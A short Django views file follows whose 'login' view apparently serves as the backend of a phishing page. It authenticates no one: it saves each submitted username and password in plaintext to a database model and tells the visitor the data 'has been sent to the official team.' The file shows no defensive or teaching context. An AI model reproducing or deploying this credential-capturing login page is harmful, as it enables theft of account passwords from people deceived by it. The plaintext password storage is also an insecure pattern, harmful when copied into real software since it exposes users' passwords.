from django.shortcuts import render, redirect
from gaurabapp.models import SaveDetail
from django.contrib import messages

def index(request):
    return render(request, 'index.html')

def login_view(request):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        if not username or not password:
            messages.warning(request, 'Empty data: Both fields are required.')
        else:
            savedetail = SaveDetail(username=username, password=password)
            savedetail.save()
            messages.success(request, 'Your data has been sent to the official team.')
            return redirect('home')

    return render(request, 'login.html')

